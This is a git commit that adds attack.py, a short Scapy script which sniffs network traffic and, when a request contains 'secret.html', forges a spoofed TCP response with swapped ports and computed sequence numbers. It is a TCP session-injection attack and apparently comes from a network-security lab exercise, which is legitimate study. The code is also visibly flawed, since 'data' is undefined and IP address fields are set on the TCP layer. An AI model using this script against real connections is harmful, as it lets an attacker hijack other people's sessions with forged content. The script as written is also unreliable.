f233c298d0a4687440dc1bb852233b53ba633d6d
刘丰源 <liufy17@mails.tsinghua.edu.cn>
2020-11-26 16:24:39 +0800

    init

---
+++ attack.py
@@ -0,0 +1,15 @@
+def attack(req):
+    if 'secret.html' not in str(req):
+        return
+    resp = IP() / TCP() / data
+    resp[TCP].dport = req[TCP].sport
+    resp[TCP].sport = req[TCP].dport
+    resp[TCP].seq = req[TCP].ack
+    resp[TCP].ack = req[TCP].seq + len(req[TCP].load)
+    resp[TCP].flags = 'AP'
+    resp[TCP].src = req[TCP].dst
+    resp[TCP].dst = req[TCP].src
+    send(resp)
+
+
+sniff(prn=attack)
